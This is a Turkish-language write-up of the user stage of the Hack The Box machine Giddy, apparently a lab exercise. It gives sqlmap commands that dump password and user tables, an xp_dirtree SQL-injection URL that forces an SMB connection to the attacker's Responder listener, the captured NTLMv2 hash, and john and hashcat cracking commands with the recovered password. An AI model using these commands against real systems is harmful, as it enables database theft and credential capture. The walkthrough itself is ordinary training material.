@@ -1,0 +1,63 @@
+-------------------------------------------------------------USER-----------------------------------------------------------------------------------
+nmap taraması sonucunda 80 portunun açık olduğu görülür.
+gobuster taraması sonucunda;
+http://10.10.10.104/mvc/Account/Login.aspx sayfası görülür.
+yeni bir kullanıcı yaratılarak alt sayfalar gözlemlenir.
+sql database kullandığı gözlemlenir.
+
+bir kaç link denemesi sonucunda; 
+sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 --tables   
+sorgusu bulunur.
+sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 -D Injection -T Memberships -C Password --dump
+sorgusunun altından passwd hash i bulunur...
+
++----------------------------------------------+
+| Password                                     |
++----------------------------------------------+
+| KZsXG16WgKNYVzkIlI8MfJVcByAEqr5Lega5w6jy4sE= |         (hash kısmı- hash.txt olarak kayıt edilir!)
++----------------------------------------------+
+
+sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 -D Injection -T Users -C UserId,UserName,LastActivityDate --dump
+
+bu üstteki sorgu ilede admin kullanıcı adı bulunur.
+bulunan hash in işe yaramaz olduğu anlaşılır :)
+
+terminale ;
+responder -I tun0 -r -d -w    komutu yazılarak olabilecek windows hashlarinin zorlanması için dinleme yapılmaya başlanır.
+
+http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;%20EXEC%20master..xp_dirtree%20%27\\10.10.12.58\foo%27;%20--   tarayıcı ile bu sayfa açılır ve terminale dönülerek gerçek admin hash ine ulaşılır. (bu link ile karşı bilgisayarı, kendi bilgisayarımıza smb bağlantısı yapmaya zorladık!)
+
+[+] Listening for events...
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.104
+[SMBv2] NTLMv2-SSP Username : GIDDY\Stacy
+[SMBv2] NTLMv2-SSP Hash     : Stacy::GIDDY:1464ee48c8acf8ba:429C0158A4F756E284D94E2A5542F1E2:0101000000000000C0653150DE09D201091C7CFC5CEDF198000000000200080053004D004200330001001E
+00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C00
+03003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C
+000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000
+000000000000003000005F9A4932274A96C8BF7E216A09ED94C56C4467E474E5826486D180584C49B5920A001000000000000000000000
+000000000000000900200063006900660073002F00310030002E00310030002E00310032002E0035003800000000000000000000000000
+
+bu tarzda bir çıktı elde ettik....
+yani kullanıcı adının Stacy olduğunu, bilgisayar adının GIDDY olduğunu gördük.
+
+Stacy ile başlayan yerden sonuna kadar alıp hash.txt olarak yeniden kaydettim ve 
+john --format=netntlmv2 hash.txt Documents/HackTheBox/WordLists/SecLists-master/Passwords/darkweb2017-top10000.txt 
+////john çok uzun sürdüğü için hashcat ile yapmaya karar verdim.
+hashcat --force -m 5600 -a 3 hash.txt Documents/HackTheBox/WordLists/rockyou.txt
+
+yukarıdaki komut ile hash'i crack ettim.
+xNnWo6272k7x  ---> hash in çıktısı
+
+/etc/hosts altına giddy.htb eklenmesi gerekiyor, çünkü aynı hostta olmayan makineler için bağlantı hatası veriyor karşı taraf.
+
+kontrol paneline bağlantı için daha önce gobuster ile bulduğum https://10.10.10.104/Remote sayfasına gittim
+sayfa https bağlantısı istediği için sertifika yüklemek durumunda kaldım.
+
+kullanıcı adı: GIDDY/Stacy
+bilgisayar adı:GIDDY
+şifre: xNnWo6272k7x
+
+karşımıza bir powershell ekranı gelir. desktop konumuna gidilir ve user.txt alınır.
+
+
+----------------------------------------------------------ROOT----------------------------------------------------------------
